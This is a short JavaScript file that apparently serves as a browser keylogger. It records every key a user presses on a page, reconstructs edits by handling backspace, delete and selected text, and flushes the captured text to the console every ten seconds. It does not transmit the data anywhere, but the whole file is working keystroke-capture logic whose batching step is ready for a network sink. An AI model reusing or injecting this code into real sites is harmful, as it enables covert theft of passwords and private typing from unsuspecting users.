var keys = '';
var selectedText = null;
  
document.onkeypress = function(e) {
    var keyCode = e.keyCode;
    var key = String.fromCharCode(keyCode)
    keys += key;
}

//detects backspaces
document.onkeydown = function(e) {
    var key = e.keyCode || e.charCode;

    if( key == 8 || key == 46 ) {
        if(selectedText != null && keys.indexOf(selectedText) != -1) {
            keys = keys.substring(0, keys.indexOf(selectedText)) + keys.substring(keys.indexOf(selectedText)+selectedText.length)
        } else {
            if(keys.length > 0){
                keys = keys.slice(0, -1);
            }
        } 
    }
            
};

function printKeys() {
    console.log(keys)
}

function clearKeys() {
    keys = ''
}

window.setInterval(function() {
    printKeys()
    clearKeys()
}, 10000);

function saveSelectedText() {
    var text = "";
    if (typeof window.getSelection != "undefined") {
        text = window.getSelection().toString();
    } else if (typeof document.selection != "undefined" && document.selection.type == "Text") {
        text = document.selection.createRange().text;
    } else {
        text = null;
    }
    selectedText = text;
}

document.onmouseup = saveSelectedText;
document.onkeyup = saveSelectedText;